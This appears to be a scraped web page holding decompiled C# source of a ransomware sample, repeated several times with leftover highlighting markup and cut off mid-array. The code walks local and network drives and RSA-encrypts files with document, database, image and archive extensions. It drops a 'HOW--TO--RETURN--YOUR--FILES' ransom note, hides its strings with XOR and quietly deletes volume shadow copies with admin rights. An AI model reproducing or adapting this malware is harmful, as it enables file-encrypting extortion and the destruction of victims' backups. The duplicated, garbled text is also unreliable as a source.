this.keyfile.Substring(0, this.keyfile.Length - 4); if (!File.Exists(f + @"\" + this.keyfile)) { try { File.WriteAllText(f + @"\" + this.keyfile, k); } catch { } } else { try { File.WriteAllText(string.Concat(new object[] { f, @"\", str, this.AmountFiles(f), ".", this.kfExt }), k); } catch { } } } /////              private void SaveNotes() { List&lt;string&gt; list = new List&lt;string&gt; { //     Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), //   Environment.GetFolderPath(Environment.SpecialFolder.Personal) //   }; for (int i = 0; i &lt; list.Count; i++) //    { this.SaveKey(list[i], this.privateKey); //     ssda.far this.AddNote(list[i]); //      } } /////   private void GetDirs(DirectoryInfo pth) { try { DirectoryInfo[] directories = pth.GetDirectories(); foreach (DirectoryInfo info in directories) { this.GetFiles(info); this.GetDirs(info); } } catch { } } /////       private void GetDrives() { try { string[] logicalDrives = Environment.GetLogicalDrives(); for (int i = 0; i &lt; logicalDrives.Length; i++) { DriveInfo info = new DriveInfo(logicalDrives[i]); if ((info.DriveType == DriveType.Fixed) || (info.DriveType == DriveType.Network)) { this.GetDirs(info.RootDirectory); } } } catch { } } ////      ... private void GetFiles(DirectoryInfo folder) { try { string[] files = Directory.GetFiles(folder.FullName, "*.*"); foreach (string str in files) { foreach (string str2 in this.extensions) //    { if ((str.ToLower().IndexOf(str2) &gt; -1) &amp;&amp; (str.ToLower().IndexOf(str2 + ".") == -1)) { string str3 = str; if (str.IndexOf(this.vNF) == -1) { this.CF(str3); ///  ... } } } } } catch { } } } }</span></span></code> , 0xd7, <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">nekema</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">Form1</span></span> : <span class="hljs-title"><span class="hljs-title">Form</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> blocksize = <span class="hljs-number"><span class="hljs-number">0xf5</span></span>; <span class="hljs-comment"><span class="hljs-comment">//245  . private IContainer components = null; private List&lt;string&gt; extensions = new List&lt;string&gt;(); //   private List&lt;string&gt; FullList = new List&lt;string&gt;(); //    private string keyCode; //   .  . private string keyfile = ""; //    "ssda.far" private string kfExt = ""; //   "far" private string kfName = ""; //   "ssda" private static readonly int MAX_PATH = 260; //   private string pbK = ""; //        . private string privateKey = ""; //        private string publicKey = ""; //     . private int repeatCount = 3; //    private List&lt;string&gt; SpecFolders = new List&lt;string&gt;(); private string vNF = ""; //   HOW--TO--RETURN--YOUR--FILES.jpg private byte X = 0x91; // //      DEXOR = 145 //////        HOW--TO--RETURN--YOUR--FILES.jpg private void AddNote(string f) { string currentDirectory = Environment.CurrentDirectory; if (f != currentDirectory) { try { if (!File.Exists(f + @"\" + this.vNF)) { Resources.ne5.Save(f + @"\" + this.vNF); } } catch { } } } ////////   -   private void CF(string f1) { byte[] destinationArray = new byte[this.blocksize]; try { byte[] sourceArray = File.ReadAllBytes(f1); if ((sourceArray.Length / (this.repeatCount + 5)) &gt;= this.blocksize) { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.publicKey); byte[] buffer3 = new byte[sourceArray.Length + (this.repeatCount * 11)]; byte[] buffer4 = new byte[sourceArray.Length - (this.repeatCount * this.blocksize)]; for (int i = 0; i &lt; this.repeatCount; i++) { Array.Copy(sourceArray, this.blocksize * i, destinationArray, 0, this.blocksize); byte[] buffer5 = provider.Encrypt(destinationArray, false); Array.Copy(buffer5, 0, buffer3, i * (this.blocksize + 11), buffer5.Length); } Array.Copy(sourceArray, this.repeatCount * this.blocksize, buffer4, 0, buffer4.Length); Array.Copy(buffer4, 0, buffer3, this.repeatCount * (this.blocksize + 11), buffer4.Length); try { File.WriteAllBytes(f1, buffer3); File.Move(f1, f1 + this.keyCode); } catch { } } } catch { } } //////          -   private string CryptKey(string s) { string str = ""; byte[] array = new byte[s.Length]; byte[] destinationArray = new byte[this.blocksize]; byte[] bytes = new byte[this.blocksize + 11]; double num = Math.Ceiling((double) (((double) s.Length) / ((double) this.blocksize))); if (s.Length &lt; (num * this.blocksize)) { int length = s.Length; for (int i = 0; i &lt; ((num * this.blocksize) - length); i++) { s = s + " "; } } array = Encoding.Default.GetBytes(s); Array.Reverse(array); try { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.pbK); for (int j = 0; j &lt; num; j++) { Array.Copy(array, j * this.blocksize, destinationArray, 0, this.blocksize); bytes = provider.Encrypt(destinationArray, false); str = str + Encoding.Default.GetString(bytes); } } catch { } return str; } /////     private void DelS() { byte[] a = new byte[] { 0xe7, 0xe2, 0xe2, 240, 0xf5, 0xfc, 0xf8, 0xff, 0xbf, 0xf4, 0xe9, 0xf4 }; byte[] buffer2 = new byte[] { 0xd5, 0xf4, 0xfd, 0xf4, 0xe5, 0xf4, 0xb1, 0xc2, 0xf9, 240, 0xf5, 0xfe, 230, 0xe2, 0xb1, 190, 0xd0, 0xfd, 0xfd, 0xb1, 190, 0xc0, 0xe4, 0xf8, 0xf4, 0xe5 }; Process process = new Process { StartInfo = { FileName = this.DeXOR(a, this.X), Arguments = this.DeXOR(buffer2, this.X), WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = true, Verb = "runas" } }; try { process.Start(); } catch { } } /////          XOR private string DeXOR(byte[] A, int x) { string str = ""; byte[] bytes = new byte[A.Length]; for (int i = 0; i &lt; A.Length; i++) { bytes[i] = (byte) (A[i] ^ x); } return (str = Encoding.Default.GetString(bytes)); } /////    . private void Init() { this.Prep(); //  this.SaveNotes(); //      this.GetDrives(); //   this.NetScan(); //   this.SetDesktopWallpaper(); //        ,    } private void Prep() { int num5; //  a = ssda.far byte[] a = new byte[] { 0xe2, 0xe2, 0xf5, 240, 0xbf, 0xf7, 240, 0xe3 }; //buffer2 = HOW--TO--RETURN--YOUR--FILES.jpg byte[] buffer2 = new byte[] {0xd9, 0xde, 0xc6, 0xbc, 0xbc, 0xc5, 0xde, 0xbc, 0xbc, 0xc3, 0xd4, 0xc5, 0xc4, 0xc3, 0xdf, 0xbc, 0xbc, 200, 0xde, 0xc4, 0xc3, 0xbc, 0xbc, 0xd7, 0xd8, 0xdd, 0xd4, 0xc2, 0xbf, 0xfb, 0xe1, 0xf6}; //buffer3 = &lt;RSAKeyValue &lt;Modulus&gt;+fFYiO9CH9iZwwzlsQ3X+qZ7Uyx290OhZ1WvLt6cmDd5oRsLoHLnoGws1CWFMOGFjtbaROSkTg3W+72/TjzHkuPp2W/RC7FBC4JpgguCi4x4ye4HEwRkQ75tHhig08hRKm1a7wlwYl8zLAzM8AwTPLh770MOzPqF1fJMKZCAtdUgIKdYNAkrP18sRbshkGNjwjMhMLNbKTaYfo3qIS4vtVUQtcw+g9ys3ZFZetKEl0ZMJEp4X7b4HK9vqUohPBYfBszXY6ion5m5tSSfhJK6OX2HPaU6RDcajTeEcmk9it9x73drJleZ1G+tVgL6duLX/uOWPVyi0rhyvYmRrGNcIQ==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt; byte[] buffer3 = new byte[] { 0xad, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf, 0xad, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xba, 0xf7, 0xd7, 200, 0xf8, 0xde, 0xa8, 210, 0xd9, 0xa8, 0xf8, 0xcb, 230, 230, 0xeb, 0xfd, 0xe2, 0xc0, 0xa2, 0xc9, 0xba, 0xe0, 0xcb, 0xa6, 0xc4, 0xe8, 0xe9, 0xa3, 0xa8, 0xa1, 0xde, 0xf9, 0xcb, 160, 0xc6, 0xe7, 0xdd, 0xe5, 0xa7, 0xf2, 0xfc, 0xd5,0xf5, 0xa4, 0xfe, 0xc3, 0xe2, 0xdd, 0xfe, 0xd9, 0xdd, 0xff, 0xfe, 0xd6, 230, 0xe2, 160, 210,0xc6, 0xd7, 220, 0xde, 0xd6, 0xd7, 0xfb, 0xe5, 0xf3, 240, 0xc3, 0xde, 0xc2, 250, 0xc5, 0xf6, 0xa2, 0xc6, 0xba, 0xa6, 0xa3, 190, 0xc5, 0xfb, 0xeb, 0xd9, 250, 0xe4, 0xc1, 0xe1, 0xa3, 0xc6,190, 0xc3, 210, 0xa6, 0xd7, 0xd3, 210, 0xa5, 0xdb, 0xe1, 0xf6, 0xf6, 0xe4, 210, 0xf8, 0xa5, 0xe9, 0xa5, 0xe8, 0xf4, 0xa5, 0xd9, 0xd4, 230, 0xc3, 250, 0xc0, 0xa6, 0xa4, 0xe5, 0xd9, 0xf9, 0xf8, 0xf6, 0xa1, 0xa9, 0xf9, 0xc3, 0xda, 0xfc, 160, 240, 0xa6, 230, 0xfd, 230, 200, 0xfd, 0xa9, 0xeb, 0xdd, 0xd0, 0xeb, 220, 0xa9, 0xd0, 230, 0xc5, 0xc1, 0xdd, 0xf9, 0xa6, 0xa6, 0xa1, 220, 0xde, 0xeb, 0xc1, 0xe0, 0xd7, 160, 0xf7, 0xdb, 220, 0xda, 0xcb, 210, 0xd0, 0xe5, 0xf5, 0xc4, 0xf6, 0xd8, 0xda, 0xf5, 200, 0xdf, 0xd0, 250, 0xe3, 0xc1, 160, 0xa9, 0xe2, 0xc3, 0xf3, 0xe2, 0xf9, 250, 0xd6, 0xdf, 0xfb, 230, 0xfb, 220, 0xf9, 220, 0xdd, 0xdf, 0xf3, 0xda, 0xc5, 240, 200, 0xf7, 0xfe, 0xa2, 0xe0, 0xd8, 0xc2, 0xa5, 0xe7, 0xe5, 0xc7, 0xc4, 0xc0, 0xe5, 0xf2, 230, 0xba, 0xf6, 0xa8, 0xe8, 0xe2, 0xa2, 0xcb, 0xd7, 0xcb, 0xf4, 0xe5, 0xda, 0xd4, 0xfd, 0xa1, 0xcb, 220, 0xdb, 0xd4, 0xe1, 0xa5, 0xc9, 0xa6, 0xf3, 0xa5, 0xd9, 0xda, 0xa8, 0xe7, 0xe0, 0xc4, 0xfe, 0xf9, 0xc1, 0xd3, 200, 0xf7, 0xd3, 0xe2, 0xeb, 0xc9, 200, 0xa7, 0xf8, 0xfe, 0xff, 0xa4, 0xfc, 0xa4, 0xe5, 0xc2, 0xc2, 0xf7, 0xf9, 0xdb, 0xda, 0xa7, 0xde, 0xc9, 0xa3, 0xd9, 0xc1, 240, 0xc4, 0xa7, 0xc3, 0xd5, 0xf2, 240, 0xfb, 0xc5, 0xf4, 0xd4, 0xf2, 0xfc, 250, 0xa8, 0xf8, 0xe5, 0xa8, 0xe9, 0xa6, 0xa2, 0xf5, 0xe3, 0xdb, 0xfd, 0xf4, 0xcb, 160, 0xd6, 0xba, 0xe5, 0xc7, 0xf6, 0xdd, 0xa7, 0xf5, 0xe4, 0xdd, 0xc9, 190, 0xe4, 0xde, 0xc6, 0xc1, 0xc7, 0xe8, 0xf8, 0xa1, 0xe3, 0xf9, 0xe8, 0xe7, 200, 0xfc, 0xc3, 0xe3, 0xd6, 0xdf, 0xf2, 0xd8, 0xc0, 0xac, 0xac, 0xad, 190, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xad, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xd0, 0xc0, 0xd0, 0xd3, 0xad, 190, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xad, 190, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf}; //  Windows Vista   -    . if (Environment.OSVersion.Version.Major &gt; 5) { new Thread(new ThreadStart(this.DelS)).Start(); } //       ... this.pbK = this.DeXOR(buffer3, this.X); string str = this.DeXOR(buffer2, this.X); this.vNF = this.DeXOR(buffer2, this.X); this.keyfile = this.DeXOR(a, this.X); this.kfExt = this.RetFExt(this.keyfile); this.kfName = this.RetFName(this.keyfile); this.keyCode = "."; //      Random random = new Random(); random.Next(0x61, 0x7a); for (int i = 0; i &lt; 1; i++) { this.keyCode = this.keyCode + Convert.ToChar(random.Next(0x61, 0x7a)).ToString(); } string[] textArray1 = new string[] { this.keyCode, (DateTime.Now.Day + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), (DateTime.Now.Month + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString() }; this.keyCode = string.Concat(textArray1); //      ... //       ... string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System); folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf(@"\system")); string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles); this.SpecFolders.Add(folderPath.ToLower()); this.SpecFolders.Add(str3.ToLower()); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xc3 }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xb5, 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xbf, 0xd3, 0xd8, 0xdf }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc2, 0xe8, 0xe2, 0xe5, 0xf4, 0xfc, 0xb1, 0xc7, 0xfe, 0xfd, 0xe4, 0xfc, 0xf4, 0xb1, 0xd8, 0xff, 0xf7, 0xfe, 0xe3, 0xfc, 240, 0xe5, 0xf8, 0xfe, 0xff }, this.X)); /*  ... c:\windows c:\program files (x86) RECYCLER $RECYCLE.BIN System Volume Information */ ///    this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfd, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 240, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf4, 0xe1, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 160, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 0xfb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xa6, 0xeb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xeb, 0xf8, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 0xf8, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf8 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf3, 0xfc, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xff, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf4, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf2, 0xf2, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 0xe5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xf4, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 230 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xf7 }, this.X)); /* *   : .cd.ldf .mdf .max .dbf .epf .1cd .md .db .pdf .ppt .xls .doc .arj .tar .7z .rar .zip .tif .jpg .ai .bmp .png .cdr .psd .jpeg .docx .xlsx .pptx .accdb .mdb .rtf .odt .ods .odb .odg .cr2 .nef .nrf .orf .arw .sr2 .srf */ //    List&lt;string&gt; list = new List&lt;string&gt;(); Process process = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view", RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { bool flag4; process.Start(); string str4 = process.StandardOutput.ReadToEnd(); int startIndex = 0; int index = 0; goto Label_0A8B; Label_0A48: startIndex = str4.IndexOf('\\', startIndex); if (startIndex == -1) { goto Label_0A98; } index = str4.IndexOf(' ', startIndex); list.Add(str4.Substring(startIndex, index - startIndex)); startIndex = index; Label_0A8B: flag4 = true; goto Label_0A48; } catch { } Label_0A98: num5 = 0; while (num5 &lt; list.Count) { Process process2 = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view " + list[num5], RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { process2.Start(); string s = process2.StandardOutput.ReadToEnd(); byte[] bytes = Encoding.GetEncoding(0x4e3).GetBytes(s); char[] separator = new char[] { '\r', '\n' }; string[] strArray = Encoding.GetEncoding("CP866").GetString(bytes).Split(separator); for (int j = 0; j &lt; strArray.Length; j++) { if (strArray[j].IndexOf("") &gt; -1) { this.FullList.Add(list[num5] + @"\" + strArray[j].Substring(0, strArray[j].IndexOf(""))); } } } catch { } num5++; } ///    ...RSA 2048 RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); this.publicKey = provider.ToXmlString(false); //     XML this.privateKey = this.CryptKey(provider.ToXmlString(true)); //      ... } /////        ssda.far private void SaveKey(string f, string k) { string str = this.keyfile.Substring(0, this.keyfile.Length - 4); if (!File.Exists(f + @"\" + this.keyfile)) { try { File.WriteAllText(f + @"\" + this.keyfile, k); } catch { } } else { try { File.WriteAllText(string.Concat(new object[] { f, @"\", str, this.AmountFiles(f), ".", this.kfExt }), k); } catch { } } } /////              private void SaveNotes() { List&lt;string&gt; list = new List&lt;string&gt; { //     Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), //   Environment.GetFolderPath(Environment.SpecialFolder.Personal) //   }; for (int i = 0; i &lt; list.Count; i++) //    { this.SaveKey(list[i], this.privateKey); //     ssda.far this.AddNote(list[i]); //      } } /////   private void GetDirs(DirectoryInfo pth) { try { DirectoryInfo[] directories = pth.GetDirectories(); foreach (DirectoryInfo info in directories) { this.GetFiles(info); this.GetDirs(info); } } catch { } } /////       private void GetDrives() { try { string[] logicalDrives = Environment.GetLogicalDrives(); for (int i = 0; i &lt; logicalDrives.Length; i++) { DriveInfo info = new DriveInfo(logicalDrives[i]); if ((info.DriveType == DriveType.Fixed) || (info.DriveType == DriveType.Network)) { this.GetDirs(info.RootDirectory); } } } catch { } } ////      ... private void GetFiles(DirectoryInfo folder) { try { string[] files = Directory.GetFiles(folder.FullName, "*.*"); foreach (string str in files) { foreach (string str2 in this.extensions) //    { if ((str.ToLower().IndexOf(str2) &gt; -1) &amp;&amp; (str.ToLower().IndexOf(str2 + ".") == -1)) { string str3 = str; if (str.IndexOf(this.vNF) == -1) { this.CF(str3); ///  ... } } } } } catch { } } } }</span></span></code> , 0xc5, <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">nekema</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">Form1</span></span> : <span class="hljs-title"><span class="hljs-title">Form</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> blocksize = <span class="hljs-number"><span class="hljs-number">0xf5</span></span>; <span class="hljs-comment"><span class="hljs-comment">//245  . private IContainer components = null; private List&lt;string&gt; extensions = new List&lt;string&gt;(); //   private List&lt;string&gt; FullList = new List&lt;string&gt;(); //    private string keyCode; //   .  . private string keyfile = ""; //    "ssda.far" private string kfExt = ""; //   "far" private string kfName = ""; //   "ssda" private static readonly int MAX_PATH = 260; //   private string pbK = ""; //        . private string privateKey = ""; //        private string publicKey = ""; //     . private int repeatCount = 3; //    private List&lt;string&gt; SpecFolders = new List&lt;string&gt;(); private string vNF = ""; //   HOW--TO--RETURN--YOUR--FILES.jpg private byte X = 0x91; // //      DEXOR = 145 //////        HOW--TO--RETURN--YOUR--FILES.jpg private void AddNote(string f) { string currentDirectory = Environment.CurrentDirectory; if (f != currentDirectory) { try { if (!File.Exists(f + @"\" + this.vNF)) { Resources.ne5.Save(f + @"\" + this.vNF); } } catch { } } } ////////   -   private void CF(string f1) { byte[] destinationArray = new byte[this.blocksize]; try { byte[] sourceArray = File.ReadAllBytes(f1); if ((sourceArray.Length / (this.repeatCount + 5)) &gt;= this.blocksize) { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.publicKey); byte[] buffer3 = new byte[sourceArray.Length + (this.repeatCount * 11)]; byte[] buffer4 = new byte[sourceArray.Length - (this.repeatCount * this.blocksize)]; for (int i = 0; i &lt; this.repeatCount; i++) { Array.Copy(sourceArray, this.blocksize * i, destinationArray, 0, this.blocksize); byte[] buffer5 = provider.Encrypt(destinationArray, false); Array.Copy(buffer5, 0, buffer3, i * (this.blocksize + 11), buffer5.Length); } Array.Copy(sourceArray, this.repeatCount * this.blocksize, buffer4, 0, buffer4.Length); Array.Copy(buffer4, 0, buffer3, this.repeatCount * (this.blocksize + 11), buffer4.Length); try { File.WriteAllBytes(f1, buffer3); File.Move(f1, f1 + this.keyCode); } catch { } } } catch { } } //////          -   private string CryptKey(string s) { string str = ""; byte[] array = new byte[s.Length]; byte[] destinationArray = new byte[this.blocksize]; byte[] bytes = new byte[this.blocksize + 11]; double num = Math.Ceiling((double) (((double) s.Length) / ((double) this.blocksize))); if (s.Length &lt; (num * this.blocksize)) { int length = s.Length; for (int i = 0; i &lt; ((num * this.blocksize) - length); i++) { s = s + " "; } } array = Encoding.Default.GetBytes(s); Array.Reverse(array); try { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.pbK); for (int j = 0; j &lt; num; j++) { Array.Copy(array, j * this.blocksize, destinationArray, 0, this.blocksize); bytes = provider.Encrypt(destinationArray, false); str = str + Encoding.Default.GetString(bytes); } } catch { } return str; } /////     private void DelS() { byte[] a = new byte[] { 0xe7, 0xe2, 0xe2, 240, 0xf5, 0xfc, 0xf8, 0xff, 0xbf, 0xf4, 0xe9, 0xf4 }; byte[] buffer2 = new byte[] { 0xd5, 0xf4, 0xfd, 0xf4, 0xe5, 0xf4, 0xb1, 0xc2, 0xf9, 240, 0xf5, 0xfe, 230, 0xe2, 0xb1, 190, 0xd0, 0xfd, 0xfd, 0xb1, 190, 0xc0, 0xe4, 0xf8, 0xf4, 0xe5 }; Process process = new Process { StartInfo = { FileName = this.DeXOR(a, this.X), Arguments = this.DeXOR(buffer2, this.X), WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = true, Verb = "runas" } }; try { process.Start(); } catch { } } /////          XOR private string DeXOR(byte[] A, int x) { string str = ""; byte[] bytes = new byte[A.Length]; for (int i = 0; i &lt; A.Length; i++) { bytes[i] = (byte) (A[i] ^ x); } return (str = Encoding.Default.GetString(bytes)); } /////    . private void Init() { this.Prep(); //  this.SaveNotes(); //      this.GetDrives(); //   this.NetScan(); //   this.SetDesktopWallpaper(); //        ,    } private void Prep() { int num5; //  a = ssda.far byte[] a = new byte[] { 0xe2, 0xe2, 0xf5, 240, 0xbf, 0xf7, 240, 0xe3 }; //buffer2 = HOW--TO--RETURN--YOUR--FILES.jpg byte[] buffer2 = new byte[] {0xd9, 0xde, 0xc6, 0xbc, 0xbc, 0xc5, 0xde, 0xbc, 0xbc, 0xc3, 0xd4, 0xc5, 0xc4, 0xc3, 0xdf, 0xbc, 0xbc, 200, 0xde, 0xc4, 0xc3, 0xbc, 0xbc, 0xd7, 0xd8, 0xdd, 0xd4, 0xc2, 0xbf, 0xfb, 0xe1, 0xf6}; //buffer3 = &lt;RSAKeyValue &lt;Modulus&gt;+fFYiO9CH9iZwwzlsQ3X+qZ7Uyx290OhZ1WvLt6cmDd5oRsLoHLnoGws1CWFMOGFjtbaROSkTg3W+72/TjzHkuPp2W/RC7FBC4JpgguCi4x4ye4HEwRkQ75tHhig08hRKm1a7wlwYl8zLAzM8AwTPLh770MOzPqF1fJMKZCAtdUgIKdYNAkrP18sRbshkGNjwjMhMLNbKTaYfo3qIS4vtVUQtcw+g9ys3ZFZetKEl0ZMJEp4X7b4HK9vqUohPBYfBszXY6ion5m5tSSfhJK6OX2HPaU6RDcajTeEcmk9it9x73drJleZ1G+tVgL6duLX/uOWPVyi0rhyvYmRrGNcIQ==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt; byte[] buffer3 = new byte[] { 0xad, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf, 0xad, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xba, 0xf7, 0xd7, 200, 0xf8, 0xde, 0xa8, 210, 0xd9, 0xa8, 0xf8, 0xcb, 230, 230, 0xeb, 0xfd, 0xe2, 0xc0, 0xa2, 0xc9, 0xba, 0xe0, 0xcb, 0xa6, 0xc4, 0xe8, 0xe9, 0xa3, 0xa8, 0xa1, 0xde, 0xf9, 0xcb, 160, 0xc6, 0xe7, 0xdd, 0xe5, 0xa7, 0xf2, 0xfc, 0xd5,0xf5, 0xa4, 0xfe, 0xc3, 0xe2, 0xdd, 0xfe, 0xd9, 0xdd, 0xff, 0xfe, 0xd6, 230, 0xe2, 160, 210,0xc6, 0xd7, 220, 0xde, 0xd6, 0xd7, 0xfb, 0xe5, 0xf3, 240, 0xc3, 0xde, 0xc2, 250, 0xc5, 0xf6, 0xa2, 0xc6, 0xba, 0xa6, 0xa3, 190, 0xc5, 0xfb, 0xeb, 0xd9, 250, 0xe4, 0xc1, 0xe1, 0xa3, 0xc6,190, 0xc3, 210, 0xa6, 0xd7, 0xd3, 210, 0xa5, 0xdb, 0xe1, 0xf6, 0xf6, 0xe4, 210, 0xf8, 0xa5, 0xe9, 0xa5, 0xe8, 0xf4, 0xa5, 0xd9, 0xd4, 230, 0xc3, 250, 0xc0, 0xa6, 0xa4, 0xe5, 0xd9, 0xf9, 0xf8, 0xf6, 0xa1, 0xa9, 0xf9, 0xc3, 0xda, 0xfc, 160, 240, 0xa6, 230, 0xfd, 230, 200, 0xfd, 0xa9, 0xeb, 0xdd, 0xd0, 0xeb, 220, 0xa9, 0xd0, 230, 0xc5, 0xc1, 0xdd, 0xf9, 0xa6, 0xa6, 0xa1, 220, 0xde, 0xeb, 0xc1, 0xe0, 0xd7, 160, 0xf7, 0xdb, 220, 0xda, 0xcb, 210, 0xd0, 0xe5, 0xf5, 0xc4, 